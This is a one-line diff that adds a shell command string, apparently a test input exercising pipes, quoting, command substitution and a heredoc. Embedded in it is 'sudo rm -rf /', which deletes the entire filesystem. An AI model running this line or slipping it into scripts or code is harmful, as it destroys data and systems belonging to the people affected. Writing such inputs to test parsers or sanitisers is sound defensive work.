@@ -1,0 +1,1 @@
+ls -la | grep 'a|b' && echo "$(id)" > /dev/null 2>&1; sudo rm -rf / ; cat <<EOF
